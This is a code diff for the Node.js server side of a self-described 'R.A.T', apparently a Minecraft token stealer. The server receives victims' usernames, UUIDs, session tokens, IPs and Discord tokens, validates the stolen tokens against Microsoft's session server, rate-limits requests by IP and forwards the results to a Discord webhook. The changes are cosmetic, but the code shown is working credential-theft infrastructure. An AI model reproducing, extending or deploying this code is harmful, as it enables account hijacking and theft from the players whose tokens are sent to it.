@@ -4,7 +4,7 @@ const
     usingMongoDB = true
 
 //setup
-require('dotenv').config()
+require("dotenv").config()
 const { post } = require("axios").default,
     express = require("express"),
     mongoose = require("mongoose"),
@@ -16,7 +16,7 @@ const { post } = require("axios").default,
 
 //plugins
 app.use(helmet()) //secure
-app.use(expressip().getIpInfoMiddleware); //ip
+app.use(expressip().getIpInfoMiddleware) //ip
 app.use(express.json()) //parse json
 app.use(express.urlencoded({ extended: true }))
 
@@ -44,17 +44,17 @@ app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
     if (!req.body.username || !req.body.uuid || !req.body.token || !req.body.ip || !req.body.feather || !req.body.essentials || !req.body.discord) {
         console.log("[R.A.T] Rejected malformed JSON")
-        return res.send(404)
+        return res.sendStatus(404)
     }
 
     //check if ip exists, if not then create a new entry, if yes then increment that entry
     if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1])
     else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ })
 
-    //check if ip is banned
+    //check if ip is banned (5 requests in 15mins)
     if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
         console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`)
-        return res.send(404)
+        return res.sendStatus(404)
     }
 
     //validate the token with microsoft auth server (rip mojang)
@@ -64,7 +64,7 @@ app.post("/", (req, res) => {
         serverId: req.body.uuid
     }), {
         headers: {
-            'Content-Type': 'application/json'
+            "Content-Type": "application/json"
         }
     })
 
@@ -107,7 +107,7 @@ app.post("/", (req, res) => {
                     attachments: []
                 }), {
                     headers: {
-                        'Content-Type': 'application/json'
+                        "Content-Type": "application/json"
                     }
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
